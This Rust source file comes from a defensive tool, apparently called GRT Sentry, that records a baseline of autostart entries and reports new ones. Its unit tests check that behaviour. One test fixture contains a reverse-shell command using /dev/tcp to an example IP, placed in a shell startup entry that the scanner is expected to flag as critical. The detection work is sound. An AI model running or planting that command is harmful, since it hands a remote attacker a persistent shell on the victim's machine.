//! What starts on its own when the machine does.
//!
//! Persistence is what turns a one-off execution into an infection. The catch
//! is that a normal desktop already has thirty or forty of these, all
//! legitimate, so the first run records what it finds as the baseline and
//! reports nothing. After that, only what is new gets mentioned.
//!
//! Where the entries come from is the system's business: desktop files, user
//! services and cron on Linux, the registry, the startup folder and the task
//! scheduler on Windows.

use rusqlite::Connection;

use crate::db;
pub use crate::platform::AutostartEntry;

use crate::platform;
use crate::state::{Action, Finding, Issue, IssueKind, IssueTarget, Severity};

/// Everything that will start by itself, sorted so two runs agree.
pub fn collect() -> Vec<AutostartEntry> {
    let mut entries = platform::autostart_entries();
    entries.sort_by(|a, b| a.key.cmp(&b.key));
    entries.dedup_by(|a, b| a.key == b.key);
    entries
}

const SOURCES: &str = "autostart-source";

/// Whether this source has been looked at before, so its entries are news.
///
/// Each source keeps its own first run: one added in a later version records
/// what it finds instead of reporting a machine's whole setup as new.
fn source_started(conn: &Connection, source: &str) -> bool {
    db::baseline_value(conn, SOURCES, source).is_some() || db::autostart_source_recorded(conn, source)
}

/// How much a new entry deserves. A line added to a shell's startup file is
/// usually a person's own alias, so it is information unless the rules see
/// something in it.
fn severity_of(entry: &AutostartEntry) -> (Severity, Option<String>) {
    if entry.source != "shell startup" {
        return (Severity::Warning, None);
    }
    let hits = crate::rules::scan_bytes(entry.command.as_bytes()).unwrap_or_default();
    match hits.iter().max_by_key(|h| h.severity) {
        Some(hit) if hit.severity != Severity::Info => (hit.severity, Some(format!("{}. {}", hit.title, hit.detail))),
        _ => (Severity::Info, None),
    }
}

/// Compares what is there now against the baseline.
///
/// A source seen for the first time records everything and reports nothing,
/// so whatever was installed before is taken as given. The interface says so.
pub fn findings(conn: &Connection) -> Vec<Finding> {
    findings_for(conn, &collect(), platform::AUTOSTART_SOURCES)
}

pub fn findings_for(conn: &Connection, entries: &[AutostartEntry], sources: &[&str]) -> Vec<Finding> {
    let started: Vec<&str> = sources.iter().copied().filter(|s| source_started(conn, s)).collect();
    let mut findings = Vec::new();
    let mut recorded = 0usize;

    for entry in entries {
        if db::autostart_is_known(conn, &entry.key) {
            continue;
        }
        let remember = || db::remember_autostart(conn, &entry.key, &entry.source, &entry.name, &entry.command);
        if !started.contains(&entry.source.as_str()) {
            let _ = remember();
            recorded += 1;
            continue;
        }

        // A warning stays until it is accepted or set aside; information is
        // said once.
        let (severity, why) = severity_of(entry);
        if severity == Severity::Info {
            let _ = remember();
        }
        findings.push(Finding::new(
            Issue {
                kind: IssueKind::UnknownAutostartEntry,
                severity,
                title: format!("New startup entry: {}", entry.name),
                location: format!("{}: {}", entry.source, entry.command),
                detail: Some({
                    let mut detail = format!(
                        "This was not in the list of things that start automatically the last time GRT Sentry looked.\n\n\
                         A recent installation explains it. Otherwise it is worth finding out what put it there.\n\n\
                         Identity: {}",
                        entry.key
                    );
                    if let Some(why) = why {
                        detail = format!("{why}\n\n{detail}");
                    }
                    if let Some(path) = platform::autostart_entry_path(&entry.key) {
                        detail.push_str(&format!("\nDeclared in: {}", path.display()));
                    }
                    detail
                }),
                actions: vec![Action::new("trust", "Expected", false), Action::ignore()],
                ..Default::default()
            },
            IssueTarget::Autostart { key: entry.key.clone(), name: entry.name.clone() },
        ));
    }

    for source in sources {
        if !started.contains(source) {
            let _ = db::set_baseline_value(conn, SOURCES, source, "started");
        }
    }

    if recorded > 0 {
        findings.push(Finding::note(Issue {
            kind: IssueKind::ModuleUnavailable,
            severity: Severity::Info,
            title: format!("{recorded} startup entries recorded as the baseline"),
            location: "Autostart".to_string(),
            detail: Some(
                "These are in places GRT Sentry had not looked at before, so what is there now has been taken as normal. From the next scan onwards, only new entries are reported."
                    .to_string(),
            ),
            actions: vec![Action::ignore()],
            ..Default::default()
        }));
    }

    findings
}

/// The full list, for the interface to show on request.
pub fn list() -> Vec<AutostartEntry> {
    collect()
}

/// Remembers an entry, so the "Expected" action stops it being new.
pub fn accept(conn: &Connection, key: &str, name: &str) -> Result<(), String> {
    db::remember_autostart(conn, key, "accepted", name, "")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_first_run_records_everything_and_alarms_about_nothing() {
        let conn = crate::db::open_memory();
        let found = findings(&conn);
        assert!(
            found.iter().all(|f| f.issue.severity == Severity::Info),
            "a first scan must not report the machine's existing setup as suspicious"
        );
    }

    #[test]
    fn an_entry_that_appears_later_is_reported_once() {
        let conn = crate::db::open_memory();
        // Pretend a first run already happened and recorded one entry.
        db::remember_autostart(&conn, "user desktop entry:old.desktop", "user", "Old", "/bin/old").unwrap();

        // A newly discovered key is new; asking again after it is recorded is not.
        assert!(!db::autostart_is_known(&conn, "user desktop entry:new.desktop"));
        db::remember_autostart(&conn, "user desktop entry:new.desktop", "user", "New", "/bin/new").unwrap();
        assert!(db::autostart_is_known(&conn, "user desktop entry:new.desktop"));
    }

    #[test]
    fn accepting_an_entry_stops_it_being_new() {
        let conn = crate::db::open_memory();
        accept(&conn, "user desktop entry:thing.desktop", "Thing").unwrap();
        assert!(db::autostart_is_known(&conn, "user desktop entry:thing.desktop"));
    }

    fn entry(source: &str, key: &str, command: &str) -> AutostartEntry {
        AutostartEntry { key: key.into(), source: source.into(), name: key.into(), command: command.into() }
    }

    #[test]
    fn a_new_entry_is_reported_until_it_is_accepted() {
        let conn = crate::db::open_memory();
        let sources = ["system service"];
        findings_for(&conn, &[], &sources);

        let later = [entry("system service", "system service:evil.service", "systemctl status evil.service")];
        assert_eq!(findings_for(&conn, &later, &sources).len(), 1);
        assert_eq!(findings_for(&conn, &later, &sources).len(), 1, "the second scan still reports it");

        accept(&conn, "system service:evil.service", "evil.service").unwrap();
        assert!(findings_for(&conn, &later, &sources).is_empty());
    }

    #[test]
    fn a_source_added_in_a_later_version_records_rather_than_reports() {
        let conn = crate::db::open_memory();
        // A 0.2 baseline: desktop entries known, nothing else ever looked at.
        db::remember_autostart(&conn, "user desktop entry:a.desktop", "user desktop entry", "A", "a").unwrap();

        let now = [
            entry("user desktop entry", "user desktop entry:a.desktop", "a"),
            entry("user desktop entry", "user desktop entry:b.desktop", "b"),
            entry("system service", "system service:cups.service", "systemctl status cups.service"),
        ];
        let found = findings_for(&conn, &now, &["user desktop entry", "system service"]);
        let titles: Vec<_> = found.iter().map(|f| f.issue.title.clone()).collect();
        assert!(titles.contains(&"New startup entry: user desktop entry:b.desktop".to_string()), "{titles:?}");
        assert!(!titles.iter().any(|t| t.contains("cups")), "a new source starts quietly");

        let later = [entry("system service", "system service:evil.service", "systemctl status evil.service")];
        let found = findings_for(&conn, &later, &["user desktop entry", "system service"]);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].issue.severity, Severity::Warning);
    }

    #[test]
    fn a_new_shell_line_is_information_unless_the_rules_see_something() {
        let conn = crate::db::open_memory();
        findings_for(&conn, &[], &["shell startup"]);
        let lines = [
            entry("shell startup", "shell startup:~/.bashrc|alias ll='ls -l'", "alias ll='ls -l'"),
            entry("shell startup", "shell startup:~/.bashrc|bash -i >& /dev/tcp/203.0.113.9/443 0>&1 &", "bash -i >& /dev/tcp/203.0.113.9/443 0>&1 &"),
        ];
        let found = findings_for(&conn, &lines, &["shell startup"]);
        let alias = found.iter().find(|f| f.issue.location.contains("alias")).unwrap();
        assert_eq!(alias.issue.severity, Severity::Info);
        let shell = found.iter().find(|f| f.issue.location.contains("/dev/tcp")).unwrap();
        assert_eq!(shell.issue.severity, Severity::Critical);
        assert!(shell.issue.detail.as_ref().unwrap().starts_with("Reverse shell"));
    }

    #[test]
    fn collecting_from_this_machine_produces_plausible_entries() {
        // The assertion is only that whatever comes back is well formed.
        for entry in collect() {
            assert!(entry.key.contains(':'));
            assert!(!entry.source.is_empty());
        }
    }
}
